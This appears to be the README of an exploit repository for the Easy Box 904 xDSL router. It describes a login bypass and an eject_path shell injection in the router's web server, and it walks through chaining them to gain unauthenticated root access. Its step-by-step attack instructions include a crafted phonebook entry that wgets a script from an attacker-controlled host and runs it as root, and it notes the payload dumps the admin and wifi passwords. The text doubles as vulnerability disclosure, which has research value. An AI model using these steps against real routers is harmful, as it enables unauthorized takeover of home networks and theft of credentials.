# easy_box_904_xdsl_exploit
This script shows a possible way, to gain root access and execute arbitrary shell scripts, prior to login, on an <br />
**Easy Box 904 xDsl Router (tested with version AT904X-04.15 (Linux 2.6.32.32 #1 Mon Feb 17 12:16:02 CST 2020))**.<br />
It exploits two vulnerabilities inside the webserver running the configuration interface, which are further described below.

## Vulnerabilities
### Login bypass vulnerability
Allows access to endpoints which should only be accessible to authenticated users

This happens, because the webserver will allow all requests where path starts with `/login` or `/cgi-bin/login` to unauthenticated users.
Note that paths with suffix `.exe` will be passed to an executable (`/usr/sbin/httpd-brn`). This program maps the last portion of the path to a function.
Example: A call to `/cgi-bin/upload_phonebook.exe` will execute a function which is mapped to `upload_phonebook.exe`

Because the webserver allows all paths starting with `/cgi-bin/login` or `/login` and the executable only uses the last portion of the url,
a call to `/cgi-bin/upload_phonebook.exe` would be blocked as an unauthenticated user, while a call to `/login/upload_phonebook.exe` passes without a problem

### Shell injection vulnerability
The settings_usb.exe endpoint in (`/usr/sbin/httpd-brn`) is used to eject a USB device.
To do that, it uses the user supplied parameter `eject_path` which is then placed in a shell exec call.
Unfortunately the input is not well sanitized and allows newline characters which can be used to inject additional commands as root user (`/usr/sbin/httpd-brn` runs as root).
Although the maximum length of the `eject_path` parameter is limited to 31 and many characters are blocked (eg. `<>&|`) it can still be used to download a script from a webserver using a tweaked phonebook backup which can be executed as a sh script.

## Exploit
### Files
 * **`exploit.bash`** Exploit script, which runs on attackers machine
 * **`remote_script.sh`** Script which will be downloaded and executed by the router. Serve this file from your webserver.
 * **`phonebook.txt`** A tweaked phonebook backup file for injecting wget command to download `remote_script.sh` on the router

### Prerequisites
  * Ability to run bash scripts (local machine)
  * Have **curl** installed (local machine)
  * Be in same network as the router or router configuration interface is exposed to the web

### Setup:
1. Setup a webserver and serve the `remote_script.sh` file as index (to keep url short and do not exceed 62 chars / also do NOT use https as routers wget is not capable of it)
2. Edit phonebook.txt and replace `<remote_script_host>` with the ip of your webserver (make sure, that server is accessible to the router)
3. Set host variable in exploit.bash to the hostname or ip of your router (`192.168.2.1` is the default value in local network) 
4. Run `exploit.bash`. The router should now download and execute `remote_script.sh`. After that, results should be printed and also be written to file `cmd_result.txt`

### Process flow
1. Obtain a token from the webinterface (this is necessary, because all further requests without a valid token will be blocked)
2. Use the `upload_phonebook.exe` endpoint to upload a tweaked phonebook backup to the router. The uploaded file will be placed in `/tmp/phone_book.txt`
    * Phonebook entries are in the form of `R_N=<name>;<type>;<phone_number>` where 
       * N is the number of the entry (`1 <= N <= 200`) 
       * name is the name of the contact (length must not exceed 62) 
       * phone_number is obviously the phone number
       * type is the type of the contact (eG. home, business, mobile, etc.). The accepted values of this field are defined by the router and must be written in in the used locale (german in this example). 
       * If you are not in Germany, it could be, that the provided `phonebook.txt` doesn't work because the type definition is german (`Privat - Festnetz`). In this case you might want to create a phonebook entry inside the routers webinterface and export the phonebook first, to obtain a valid type definition
    * The `/tmp/phone_book.txt` file can be interpreted as a shell script which will execute `R_N=<name>;<type>;<phone_number>` as a variable declaration where command substitution can be used to inject commands
    * Example: ``R_1=`echo hello world`#;Privat - Festnetz;1111`` would execute `echo hello world`
3. Mark `/tmp/phone_book.txt` as executable and execute `/tmp/phone_book.txt` by using the shell injection in `settings_usb.exe`
    * Note that slashes(`/`) and minus(`-`) characters are not allowed in phonebook entries. To bypass that restriction, they are passed to the script as paramters `${1} => '/'` and `${2} => '-'` (see `phonebook.txt`)
4. The phonebook entry ``R_1=`wget http:${1}${1}<remote_script_host> ${2}O ${1}tmp${1}exploit`#;Privat - Festnetz;1111"`` will be interpreted as a variable declaration with command substitution and thus will execute wget to download `remote_script.sh` from a webserver running at `<remote_script_host>` to file `/tmp/exploit`
5. Mark `/tmp/exploit` as executable and execute `/tmp/exploit` by using the shell injection in `settings_usb.exe`
    * The script `/tmp/exploit` is now being executed with root privileges, because the webserver runs as root
 6. If you use the given `remote_script.sh` file, the script should output the password of the routers webinterface and all wifi passwords, which are both stored in `/etc/config/.glbcfg`. This is just for proof of concept
